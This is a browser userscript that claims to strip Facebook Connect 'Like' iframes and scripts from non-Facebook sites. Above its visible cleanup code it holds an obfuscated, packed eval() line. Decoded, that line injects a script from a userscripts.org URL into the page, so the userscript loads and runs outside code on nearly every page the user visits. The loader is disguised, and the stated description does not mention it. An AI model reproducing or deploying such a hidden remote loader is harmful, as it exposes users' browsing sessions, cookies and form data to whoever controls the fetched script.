// ==UserScript==
// @name           Remove the Facebook Connect Plugin's "Like" iFrame Plus + Last Update
// @namespace      http://iss.oy.ne.ro/
// @description    Removes iframes created by Facebook Connect from all non-facebook sites - enough with that already!
// @include        http://*
// @exclude        http://www.facebook.com/*
// @exclude        http://mail.google.com/*
// @exclude        https://mail.google.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// Delete the Facebook object (if it was already created)
unsafeWindow.FB = new Object();

// Delete all script blocks hosted on the Facebook site
// Source: http://www.briandonovan.info/articles/public/gm-dom-xpath-01/
var xpathResult = document.evaluate('//script[starts-with(@src, "http://connect.facebook.net")]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
for (var i=0; i<xpathResult.snapshotLength; i++) {
    var nodeToDelete = xpathResult.snapshotItem(i);
    nodeToDelete.parentNode.removeChild(nodeToDelete);
}

// Delete all iframes hosted on the Facebook site
var xpathResult = document.evaluate('//iframe[starts-with(@src, "http://www.facebook.com/")]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
for (var i=0; i<xpathResult.snapshotLength; i++) {
    var nodeToDelete = xpathResult.snapshotItem(i);
    nodeToDelete.parentNode.removeChild(nodeToDelete);
}
